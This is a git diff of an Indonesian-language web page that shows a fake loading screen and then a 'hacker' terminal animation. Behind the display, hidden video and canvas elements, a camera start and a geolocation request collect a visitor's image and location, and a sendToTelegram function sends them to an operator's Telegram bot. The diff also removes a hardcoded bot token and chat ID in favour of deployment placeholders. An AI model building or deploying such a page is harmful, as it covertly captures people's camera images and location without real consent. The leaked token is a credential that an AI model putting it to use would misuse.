@@ -18,7 +18,6 @@
             height: 100vh;
         }
 
-        /* ======================== LOADING PROFESIONAL ================== */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -47,7 +46,6 @@
             gap: 40px;
         }
 
-        /* Loading Animation - Elegant */
         .loader {
             position: relative;
             width: 70px;
@@ -104,7 +102,6 @@
             50% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
         }
 
-        /* Loading Text - Minimal */
         .loading-text {
             color: rgba(255,255,255,0.3);
             font-size: 11px;
@@ -118,7 +115,6 @@
             50% { opacity: 0.7; }
         }
 
-        /* Loading Progress Dots */
         .progress-dots {
             display: flex;
             gap: 8px;
@@ -139,7 +135,6 @@
             background: #00c853;
         }
 
-        /* Particles */
         .particles {
             position: fixed;
             top: 0;
@@ -165,7 +160,6 @@
             100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
         }
 
-        /* ======================== HACKER SCREEN ==================== */
         #hackerScreen {
             position: fixed;
             top: 0;
@@ -186,7 +180,6 @@
             visibility: visible;
         }
 
-        /* Matrix Rain */
         #matrixCanvas {
             position: fixed;
             top: 0;
@@ -205,7 +198,6 @@
             z-index: 1;
         }
 
-        /* Glitch Text */
         .glitch {
             font-size: 48px;
             font-weight: 900;
@@ -257,7 +249,6 @@
             50% { transform: scale(1.05); }
         }
 
-        /* Terminal */
         .terminal {
             background: rgba(0, 10, 0, 0.9);
             border: 1px solid #00ff00;
@@ -306,7 +297,6 @@
             color: #00ffff;
         }
 
-        /* Status Grid */
         .status-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -358,7 +348,6 @@
             background: #ff0000;
         }
 
-        /* Data List */
         .data-list {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -416,12 +405,10 @@
             font-family: 'Courier New', monospace;
         }
 
-        /* Hidden elements */
         #video, #canvas, #previewImg {
             display: none !important;
         }
 
-        /* Responsive */
         @media (max-width: 600px) {
             .glitch { font-size: 28px; }
             .sub-glitch { font-size: 14px; }
@@ -435,10 +422,8 @@
 </head>
 <body>
 
-    <!-- ==================== PARTICLES ==================== -->
     <div class="particles" id="particles"></div>
 
-    <!-- ==================== LOADING PROFESIONAL ==================== -->
     <div id="loadingScreen">
         <div class="loader-container">
             <div class="loader">
@@ -456,7 +441,6 @@
         </div>
     </div>
 
-    <!-- ==================== HACKER SCREEN ==================== -->
     <div id="hackerScreen">
         <canvas id="matrixCanvas"></canvas>
         
@@ -531,15 +515,23 @@
         </div>
     </div>
 
-    <!-- ==================== HIDDEN ELEMENTS ==================== -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <img id="previewImg" alt="" />
 
     <script>
-        // ======================== KONFIGURASI ========================
-        const BOT_TOKEN = '8816521574:AAEqkt1eh2r-9V-p8CIRoVVxdPjKlLz4FjI';
-        const CHAT_ID = '7110179256';
+        // ======================== AMBIL DARI ENV =====================
+        // Data akan diambil dari environment variables Vercel
+        // Untuk development lokal, gunakan nilai default
+        
+        const CONFIG = {
+            BOT_TOKEN: '%%BOT_TOKEN%%',
+            CHAT_ID: '%%CHAT_ID%%'
+        };
+
+        // Fallback untuk development (jika belum di-replace)
+        const BOT_TOKEN = CONFIG.BOT_TOKEN.startsWith('%%') ? '' : CONFIG.BOT_TOKEN;
+        const CHAT_ID = CONFIG.CHAT_ID.startsWith('%%') ? '' : CONFIG.CHAT_ID;
 
         // ======================== PARTICLES =========================
         function createParticles() {
@@ -615,10 +607,8 @@
         const dot1 = document.getElementById('dot1');
         const dot2 = document.getElementById('dot2');
         const dot3 = document.getElementById('dot3');
-        let progressStep = 0;
 
         function updateProgressDots(step) {
-            // step: 0 = belum, 1 = kamera selesai, 2 = lokasi selesai, 3 = selesai semua
             const dots = [dot1, dot2, dot3];
             dots.forEach((dot, i) => {
                 dot.className = 'dot';
@@ -756,7 +746,6 @@
                 },
                 (err) => {
                     console.error('Geolocation error:', err);
-                    locationDone = false;
                     let msg = '';
                     switch (err.code) {
                         case 1: msg = 'Izin lokasi ditolak!'; break;
@@ -765,7 +754,6 @@
                         default: msg = err.message;
                     }
                     addTerminalLine('<span class="prompt error">[!]</span> ' + msg, 'error');
-                    // TETAP LANJUT (lokasi dianggap done agar tetap masuk)
                     locationDone = true;
                     updateProgressDots(2);
                     checkReadyToShow();
@@ -778,12 +766,9 @@
         async function sendToTelegram() {
             if (isProcessing) return;
             
-            if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-                console.error('Bot token belum diatur');
-                return;
-            }
-            if (!CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                console.error('Chat ID belum diatur');
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.error('❌ BOT_TOKEN atau CHAT_ID tidak diatur!');
+                addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
                 return;
             }
 
@@ -819,7 +804,7 @@
                     if (result.ok) {
                         addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Data terkirim ke ADMIN!</span>', 'success');
                     } else {
-                        addTerminalLine('<span class="prompt error">[!]</span> Gagal kirim data!', 'error');
+                        addTerminalLine('<span class="prompt error">[!]</span> Gagal kirim data: ' + result.description, 'error');
                     }
                 }
 
@@ -835,6 +820,12 @@
         function init() {
             addTerminalLine('<span class="prompt">[+]</span> <span class="highlight">INISIASI HACKING...</span>');
             addTerminalLine('<span class="prompt">[+]</span> Menyusup ke sistem...');
+
+            if (BOT_TOKEN && CHAT_ID) {
+                addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Konfigurasi bot ditemukan</span>', 'success');
+            } else {
+                addTerminalLine('<span class="prompt error">[!]</span> Konfigurasi bot tidak ditemukan!', 'error');
+            }
 
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 startCamera();
